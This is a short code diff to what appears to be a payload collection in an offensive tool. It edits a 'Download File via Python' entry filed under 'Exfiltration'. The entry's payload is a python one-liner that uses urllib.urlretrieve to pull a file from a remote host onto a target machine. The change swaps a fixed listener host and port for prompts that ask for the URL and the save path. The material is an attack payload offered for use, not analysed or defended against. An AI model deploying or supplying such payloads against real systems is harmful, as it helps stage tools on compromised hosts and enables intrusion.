@@ -112,10 +112,11 @@ Load({
 
 Load({
 	title: "Download File via Python",
-	payload:'python -c \'import urllib;urllib.urlretrieve ("http://<LHOST>:<LPORT>/<PROMPT>","<PATH>");\'',
+	payload:'python -c \'import urllib;urllib.urlretrieve ("<PROMPT (URI)>","<PROMPT (local path to save to)>");\'',
 	category: "Exfiltration",
 	callback: function(bro){
-		question("What file would you like to download? (ex: script.sh)");
+		question("What would you like to download? (ex: http://foo.bar/script.sh)");
+		question("Where would you like to save it? (ex: /tmp/script.sh)");
 		ask.some(questions, bro);
 	}
 })
